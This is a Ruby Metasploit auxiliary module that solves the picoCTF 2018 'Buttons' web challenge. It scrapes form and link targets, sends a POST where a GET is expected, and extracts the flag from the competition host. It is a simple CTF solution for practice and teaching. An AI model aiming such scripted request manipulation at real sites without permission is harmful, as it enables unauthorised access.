#!/usr/bin/env ruby

require 'msf/core'  # Metasploit module

class MetasploitModule < Msf::Auxiliary

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'Web Explotation: Buttons - Points: 250',
      'Description' => %q(
                        There is a website running at http://2018shell2.picoctf.com:44730. Try to see if you can push their buttons.

                        [HINTS]:
                          What's different about the two buttons?
                        ),
      'Author'      => ['CosasDePuma <https://github.com/cosasdepuma>'],
      'Privileged'  => 'false',
      'License'     => MSF_LICENSE
    )

    deregister_options('Proxies', 'VHOST', 'SSL')

    deregister_options(                           # Advanced Options
      'DOMAIN', 'DigestAuthIIS', 'FingerprintCheck', 'HttpClientTimeout',
      'HttpPassword', 'HttpTrace', 'HttpUsername', 'SSLVersion', 'WORKSPACE'
    )

    register_options(
      [
        Opt::RHOST('2018shell2.picoctf.com'),
        Opt::RPORT('44730')
      ], self.class
    )
  end

  def run
    begin
      # Send a GET request to the server
      print_status("Sending GET request to TCP/#{rport} /...")
      res = send_request_cgi({
        'uri'     => '/',
        'method'  => 'GET'
      })
      # Get the body of the request
      html_source = res.get_html_document.to_s
      # Find the next URI
      link = html_source.scan(/action=".*?"/)[0]
      link = '/' + link.gsub(/"/, '').gsub(/action=/, '')
      # Send a POST request to the server
      print_status("Sending POST request to TCP/#{rport} #{link}...")
      res = send_request_cgi({
        'uri'     => link,
        'method'  => 'POST'
      })
      # Get the body of the request
      html_source = res.get_html_document.to_s
      # Find the next URI
      link = html_source.scan(/a href=".*\"/)[0]
      link = '/' + link.gsub(/a href=/, '').gsub(/"/, '')
      # Send a POST request to the server
      print_status("Sending POST request to TCP/#{rport} #{link}...")
      res = send_request_cgi({
        'uri'     => link,
        'method'  => 'POST'
      })
      # Get the body of the request
      html_source = res.get_html_document.to_s
      # Get the flag
      flag = html_source.scan(/picoCTF{.*}/)[0]
      print_good("Solved: #{flag}")
    rescue
      # Handle errors
      print_error('Unhandled exception during execution')
    end
  end

end
